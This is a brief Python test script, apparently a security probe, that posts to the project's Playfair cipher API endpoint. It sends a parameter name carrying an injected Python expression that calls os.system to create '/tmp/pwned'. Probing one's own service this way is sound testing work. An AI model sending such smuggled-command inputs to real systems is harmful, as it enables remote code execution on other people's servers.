from fastapi.testclient import TestClient
from backend.app.main import app

client = TestClient(app)
response = client.post("/api/algorithms/playfair/execute", json={
    "input": "hello",
    "params": {"__import__('os').system('touch /tmp/pwned')": 1}
})
print(response.status_code)
print(response.json())
